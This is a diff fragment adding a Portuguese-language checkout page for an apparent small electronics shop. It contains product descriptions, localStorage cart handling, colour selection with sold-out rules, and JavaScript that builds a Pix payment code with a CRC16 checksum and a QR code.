+• Proteção Inteligente contra Sobrecarga: Chip interno que identifica a voltagem do teu aparelho e corta a energia assim que a bateria está cheia, preservando a vida útil do dispositivo.
+• Design Compacto e Robusto: Construído com materiais resistentes ao calor, é fácil de transportar na mochila ou no bolso sem ocupar espaço.
+• Certificação de Segurança: Proteção total contra curto-circuitos e aquecimento excessivo, oferecendo tranquilidade durante o uso noturno.
+• Compatibilidade Universal: Perfeito para iPhones (do 8 ao 16), iPads, Samsung Galaxy, Xiaomi e qualquer dispositivo com entrada USB-C.`,
+
+    "capa silicone": `A Capa de Silicone Premium oferece a proteção ideal contra quedas e riscos, mantendo o design original e a elegância do teu smartphone.
+• Toque Suave (Soft Touch): Acabamento exterior sedoso que proporciona uma pegada firme e confortável, evitando que o telemóvel escorregue das mãos.
+• Interior em Microfibra: Revestimento interno aveludado que protege a traseira do teu aparelho contra riscos causados por grãos de areia ou poeira.
+• Proteção 360 Graus: Bordas ligeiramente elevadas que protegem tanto a tela frontal quanto as lentes da câmara contra impactos diretos em superfícies planas.
+• Encaixe Perfeito: Botões macios e recortes precisos que não interferem no uso de carregadores, cabos ou na saída de som.
+• Material de Alta Durabilidade: Silicone de alta densidade que não amarela com o tempo e é fácil de limpar com apenas um pano húmido.
+• Design Slim: Proteção robusta sem adicionar volume desnecessário ao aparelho, mantendo-o leve e fácil de guardar no bolso.`,
+
+       "película privativa": `A Película de Vidro Privativa é a solução definitiva para quem valoriza a segurança dos seus dados e a sua intimidade em locais públicos.
+• Tecnologia Anti-Spy: O ecrã fica totalmente escuro para quem olha de lado (ângulos superiores a 30°), permitindo que apenas você veja o conteúdo.
+• Vidro Temperado 9H: Ultra resistência contra riscos, impactos e quedas, mantendo o ecrã original do seu smartphone intacto.
+• Sensibilidade Total ao Toque: Camada ultra-fina que não interfere na resposta do touch screen nem na leitura da impressão digital.
+• Revestimento Oleofóbico: Repele marcas de dedos, gordura e sujidade, mantendo o ecrã sempre limpo e com brilho nítido.
+• Encaixe Perfeito: Recortes precisos para a câmara frontal e sensores, garantindo que o Face ID ou sensores de proximidade funcionem perfeitamente.
+• Instalação Sem Bolhas: Tecnologia de adesão automática que facilita a aplicação e evita aquelas bolhas de ar indesejadas.`,
+
+    "fone bluetooth": `O Fone Bluetooth Wireless entrega liberdade total de movimentos com uma qualidade sonora cristalina e graves potentes.
+• Conexão Bluetooth 5.3: Tecnologia de última geração que garante uma ligação estável, sem cortes e com baixíssimo consumo de bateria.
+• Microfone Integrado com Redução de Ruído: Atenda chamadas com clareza total, filtrando o barulho do vento e das ruas durante as suas conversas.
+• Design Ergonómico In-Ear: Encaixe seguro e confortável que não cai durante exercícios físicos ou caminhadas intensas.
+• Estojo de Carregamento Inteligente: Armazene e carregue os seus fones simultaneamente, garantindo várias horas extras de reprodução longe da tomada.
+• Controlos Inteligentes: Mude de música, ajuste o volume ou acione o assistente de voz (Siri/Google) com apenas alguns toques no fone.
+• Emparelhamento Automático: Basta tirar do estojo para que os fones se conectem instantaneamente ao seu smartphone cadastrado.`,
+
+       "cabo usb-c": `O Cabo USB-C de Alta Velocidade foi projetado para suportar as demandas dos dispositivos mais modernos, garantindo carregamento rápido e transferência de dados estável.
+• Carregamento Ultra Rápido: Suporta altas potências (PD) para carregar o seu smartphone, tablet ou até notebook com máxima eficiência.
+• Transferência de Dados de Alta Performance: Sincronize fotos, vídeos e documentos em segundos com taxas de transferência superiores.
+• Material Reforçado: Revestimento em nylon trançado ou TPE de alta densidade que evita quebras, dobras e o desgaste prematuro nas pontas.
+• Conectores em Alumínio: Pontas blindadas que resistem à oxidação e garantem um encaixe firme e seguro em todas as utilizações.
+• Comprimento Ideal: Flexibilidade total para usar o dispositivo enquanto carrega, seja no sofá, na cama ou no escritório.
+• Compatibilidade Universal: Funciona perfeitamente em toda a linha iPhone 15 e 16, Samsung Galaxy, Xiaomi, consoles portáteis e MacBooks.`,
+
+    "suporte veicular": `O Suporte Veicular Universal oferece a máxima segurança e praticidade para você navegar pelo GPS ou atender chamadas enquanto dirige.
+• Fixação Ultra Firme: Sistema de ventosa de alta pressão ou trava para grade de ventilação que mantém o celular estável mesmo em buracos ou pistas irregulares.
+• Rotação 360 Graus: Ajuste o ângulo de visão livremente para usar o smartphone tanto na vertical quanto na horizontal.
+• Ajuste Universal: Braços expansíveis que acomodam qualquer tamanho de smartphone, desde modelos pequenos até os maiores modelos Max e Ultra.
+• Proteção de Silicone: Interior emborrachado que evita riscos nas laterais do seu aparelho e garante que ele não escorregue com a vibração.
+• Instalação Simples: Não exige ferramentas; em poucos segundos você fixa o suporte no painel, vidro ou saída de ar do veículo.
+• Design Ergonômico: Posiciona o celular de forma que não bloqueia a visão da estrada, garantindo uma condução muito mais segura e confortável.`,
+
+    "s20 ultra": "..."
+};
+
+
+let produtoAtualIndex = 0; // Esta linha deve ficar logo acima da função selCor
+
+function selCor(el) {
+    let carrinho = window.carrinhoExpandido;
+    if (!carrinho || carrinho.length === 0) return;
+
+    document.querySelectorAll('.cor-opt').forEach(opt => opt.classList.remove('active'));
+    el.classList.add('active');
+    
+    const corSelecionada = el.innerText;
+    carrinho[produtoAtualIndex].corEscolhida = corSelecionada;
+    
+    const nomeBase = carrinho[produtoAtualIndex].n.replace(/\s+/g, '-').toLowerCase();
+    const novaFoto = `cores/${nomeBase}-${corSelecionada.toLowerCase()}.jpg`;
+    
+    document.getElementById('js-img').src = novaFoto;
+    carrinho[produtoAtualIndex].f = novaFoto;
+
+    document.getElementById('js-cor-resumo').innerText = corSelecionada;
+    
+    const minis = document.querySelectorAll('.mini-foto');
+    if (minis[produtoAtualIndex]) {
+        minis[produtoAtualIndex].src = novaFoto;
+    }
+}
+function toggleDesc() {
+    const t = document.getElementById('js-desc');
+    const b = document.getElementById('js-btn-ver');
+    t.classList.toggle('aberta');
+    b.innerText = t.classList.contains('aberta') ? "Ver menos" : "Ver mais";
+}
+
+function setMetodo(m) {
+    document.getElementById('opt-pix').classList.toggle('active', m === 'pix');
+    document.getElementById('opt-card').classList.toggle('active', m === 'card');
+    document.getElementById('pix-form').style.display = m === 'pix' ? 'block' : 'none';
+    document.getElementById('card-form').style.display = m === 'card' ? 'block' : 'none';
+}
+
+function copiarPix() {
+    navigator.clipboard.writeText(document.getElementById('js-pix-pld').innerText);
+    alert("Código Pix copiado!");
+}
+
+function update() {
+    let carrinhoOriginal = JSON.parse(localStorage.getItem('carrinhoTechStore')) || [];
+    if(carrinhoOriginal.length === 0) return;
+
+    // Expande carrinho com base na quantidade
+    let carrinho = [];
+    carrinhoOriginal.forEach(prod => {
+        const qty = prod.qty || 1;
+        for (let q = 0; q < qty; q++) {
+            carrinho.push(Object.assign({}, prod, {qty: 1}));
+        }
+    });
+    window.carrinhoExpandido = carrinho;
+
+    // 1. Soma o total
+    let totalGeral = 0;
+    carrinho.forEach(p => totalGeral += parseFloat(p.p));
+    const vTxtTotal = "R$ " + totalGeral.toLocaleString('pt-BR', {minimumFractionDigits:2});
+
+    document.getElementById('js-sub').innerText = vTxtTotal;
+        document.getElementById('js-total-fim').innerText = vTxtTotal;
+    document.getElementById('js-total-rod').innerText = vTxtTotal;
+
+    // --- COLE O CÓDIGO AQUI ---
+    const selectParcelas = document.getElementById('f-parcelas');
+    if (selectParcelas) {
+        selectParcelas.innerHTML = ""; 
+        for (let i = 1; i <= 12; i++) {
+            const valorParcela = (totalGeral / i).toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            const option = document.createElement('option');
+            option.value = i;
+            option.text = `${i}x de R$ ${valorParcela} sem juros`;
+            selectParcelas.appendChild(option);
+        }
+    }
+    // --------------------------
+
+    carrinho.forEach((prod, index) => {
+        // Se o produto não tiver uma cor escolhida ainda, definimos "Branco" como padrão
+        if (!prod.corEscolhida) {
+            prod.corEscolhida = "Branco";
+        }
+        // Força o caminho da foto para a pasta cores com a cor atual
+        const nomeBase = prod.n.replace(/\s+/g, '-').toLowerCase();
+        prod.f = `cores/${nomeBase}-${prod.corEscolhida.toLowerCase()}.jpg`;
+    });
+    
+    // Salva o carrinho atualizado com os novos caminhos de foto
+
+    // 3. Cria as miniaturas na galeria (agora já com as fotos da pasta cores)
+    const galeria = document.getElementById('js-galeria');
+    galeria.innerHTML = "";
+    carrinho.forEach((prod, index) => {
+        const img = document.createElement('img');
+        img.src = prod.f;
+        img.className = "mini-foto" + (index === 0 ? " ativa" : "");
+        img.onclick = function() { selectProduct(index); };
+        galeria.appendChild(img);
+    });
+
+    selectProduct(0);
+
+    // 4. Pix
+    genPix(totalGeral);
+}
+
+// ESTA FUNÇÃO MUDA O PRODUTO QUANDO VOCÊ CLICA NA FOTINHA
+function selectProduct(index) {
+    produtoAtualIndex = index;
+    let carrinho = window.carrinhoExpandido || JSON.parse(localStorage.getItem('carrinhoTechStore')) || [];
+    const prod = carrinho[index];
+    const quant = carrinho.length;
+    
+    document.getElementById('js-img').src = prod.f;
+    document.getElementById('js-nome').innerText = quant > 1 ? prod.n + " e mais " + (quant - 1) + " itens" : prod.n;
+    document.getElementById('js-preco-topo').innerText = "R$ " + parseFloat(prod.p).toLocaleString('pt-BR', {minimumFractionDigits:2});
+
+    const nomeBusca = prod.n.toLowerCase();
+    document.getElementById('js-desc').innerText = baseDescricoes[nomeBusca] || "Descrição Premium.";
+
+    // --- LÓGICA DE CORES COM TEXTO "ESGOTADO" ---
+    const botoesCores = document.querySelectorAll('.cor-opt');
+    const coresOriginais = ["Branco", "Preto", "Cinza", "Azul"]; 
+
+    botoesCores.forEach((opt, i) => {
+        const corBase = coresOriginais[i];
+        opt.innerText = corBase;
+        opt.classList.remove('esgotado');
+        opt.style.pointerEvents = "auto";
+
+        const nomeProdBaixo = prod.n.toLowerCase();
+
+        // Regra 1: iPhone 15 Pro + Azul esgotado
+        if (nomeProdBaixo.includes("iphone 15 pro") && corBase === "Azul") {
+            opt.innerText = "Azul (Esgotado)";
+            opt.classList.add('esgotado');
+            opt.style.pointerEvents = "none";
+        }
+
+        // Regra 2: iPhone 13 + Cinza esgotado
+        if (nomeProdBaixo.includes("iphone 13") && !nomeProdBaixo.includes("pro") && corBase === "Cinza") {
+            opt.innerText = "Cinza (Esgotado)";
+            opt.classList.add('esgotado');
+            opt.style.pointerEvents = "none";
+        }
+
+        // Regra 3: iPhone 12 + Cinza esgotado (A QUE VOCÊ QUER AGORA)
+        if (nomeProdBaixo.includes("iphone 12") && !nomeProdBaixo.includes("pro") && corBase === "Cinza") {
+            opt.innerText = "Cinza (Esgotado)";
+            opt.classList.add('esgotado');
+            opt.style.pointerEvents = "none";
+        }
+    });
+
+    // Sincroniza o botão ativo
+    const corSalva = prod.corEscolhida || "Branco";
+    botoesCores.forEach(opt => {
+        // Compara o início do texto para ignorar o "(Esgotado)" na verificação
+        opt.classList.toggle('active', opt.innerText.startsWith(corSalva));
+    });
+    
+    document.getElementById('js-cor-resumo').innerText = corSalva;
+    document.querySelectorAll('.mini-foto').forEach((m, i) => m.classList.toggle('ativa', i === index));
+}
+
+window.onload = update;
+
+function genPix(v) {
+    const chave = "5663014b-ba23-4c57-b239-26914c95a8c0"; // Sua chave Pix
+    const nome = "TECHSTORE";
+    const cidade = "SAO PAULO";
+    const vS = v.toFixed(2);
+
+    let p = "000201";
+    let mai = "0014BR.GOV.BCB.PIX01" + chave.length.toString().padStart(2, '0') + chave;
+    p += "26" + mai.length.toString().padStart(2, '0') + mai;
+    p += "52040000530398654" + vS.length.toString().padStart(2, '0') + vS;
+    p += "5802BR59" + nome.length.toString().padStart(2, '0') + nome;
+    p += "60" + cidade.length.toString().padStart(2, '0') + cidade;
+    let adf = "0503***"; 
+    p += "62" + (adf.length + 4).toString().padStart(2, '0') + "05" + adf.length.toString().padStart(2, '0') + adf;
+    p += "6304";
+
+    // ESTA É A FUNÇÃO QUE RESOLVE O ERRO DE "CÓDIGO INVÁLIDO"
+    function crc16(data) {
+        let crc = 0xFFFF;
+        for (let i = 0; i < data.length; i++) {
+            crc ^= (data.charCodeAt(i) << 8);
+            for (let j = 0; j < 8; j++) {
+                if ((crc & 0x8000) !== 0) crc = (crc << 1) ^ 0x1021;
+                else crc <<= 1;
+            }
+        }
+        return (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
+    }
+
+        const final = p + crc16(p);
+    
+    document.getElementById('js-pix-pld').innerText = final;
+    document.getElementById('qrcode').innerHTML = ""; 
+    new QRCode(document.getElementById("qrcode"), { text: final, width: 140, height: 140 });
+}
+</script>
+
+<script src="https://sdk.mercadopago.com/js/v2"></script>
+<script src="validar.js"></script>
+
+</body>
+</html>
